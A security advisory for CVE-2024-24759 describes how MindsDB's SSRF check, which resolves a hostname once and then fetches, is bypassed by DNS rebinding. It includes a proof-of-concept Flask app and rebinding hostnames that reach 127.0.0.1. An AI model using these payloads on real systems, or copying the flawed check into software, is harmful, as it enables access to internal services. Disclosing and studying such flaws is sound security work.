# MindsDB Vulnerable to Bypass of SSRF Protection with DNS Rebinding

**GHSA**: GHSA-4jcv-vp96-94xr | **CVE**: CVE-2024-24759 | **Severity**: high (CVSS 9.3)

**CWE**: CWE-350, CWE-918

**Affected Packages**:
- **mindsdb** (pip): < 23.12.4.2

## Description

### Summary

DNS rebinding is a method of manipulating resolution of domain names to let the initial DNS query hits an address and the second hits another one. For instance the host `make-190.119.176.200-rebind-127.0.0.1-rr.1u.ms`  would be initially resolved to `190.119.176.200` and the next DNS issue to `127.0.0.1`. Please notice the following in the latest codebase:

```python
def is_private_url(url: str):
    """
    Raises exception if url is private

    :param url: url to check
    """

    hostname = urlparse(url).hostname
    if not hostname:
        # Unable to find hostname in url
        return True
    ip = socket.gethostbyname(hostname)
    return ipaddress.ip_address(ip).is_private

``` 

As you can see, during the call to `is_private_url()` the initial DNS query would be issued by `ip = socket.gethostbyname(hostname)` to an IP (public one) and then due to DNS Rebinding, the next GET request would goes to the private one.

### PoC

```python
from flask import Flask, request, jsonify
from urllib.parse import urlparse
import socket
import ipaddress
import requests

app = Flask(__name__)


def is_private_url(url: str):
    """
    Raises exception if url is private

    :param url: url to check
    """

    hostname = urlparse(url).hostname
    if not hostname:
        # Unable to find hostname in url
        return True
    ip = socket.gethostbyname(hostname)
    if ipaddress.ip_address(ip).is_private:
        raise Exception(f"Private IP address found for {url}")


@app.route("/", methods=["GET"])
def index():
    return "http://127.0.0.1:5000/check_private_url?url=https://www.google.Fr"


@app.route("/check_private_url", methods=["GET"])
def check_private_url():
    url = request.args.get("url")

    if not url:
        return jsonify({"error": 'Missing "url" parameter'}), 400

    try:
        is_private_url(url)
        response = requests.get(url)

        return jsonify(
            {
                "url": url,
                "is_private": False,
                "text": response.text,
                "status_code": response.status_code,
            }
        )
    except Exception as e:
        return jsonify({"url": url, "is_private": True, "error": str(e)})


if __name__ == "__main__":
    app.run(debug=True)

```

After running the poc.py with flask installed, consider visiting the following URLs:

1. http://127.0.0.1:5000/check_private_url?url=https://www.example.com since it is in the public space, you would get `is_private: false` and the GET request would be issued to the www.Example.com website.
3. http://127.0.0.1:5000/check_private_url?url=http://localhost:8667, this one the address is private, you would get `is_private: true`
4. http://127.0.0.1:5000/check_private_url?url=http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/ But this one, it initially returns the public IP `190.119.176.214` and then DNS rebind into the network location `127.0.0.1:8667`.

I set up a simple HTTP server at `127.0.0.1:8667`, you can notice the results of the PoC in the next screenshot:

```
{
  "is_private": false,
  "status_code": 200,
  "text": "<pre>\n<a href=\"poc.py\">poc.py</a>\n</pre>\n",
  "url": "http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/"
}

```


### Impact
 - Bypass the SSRF protection on the whole website with DNS Rebinding.
 - DoS too.

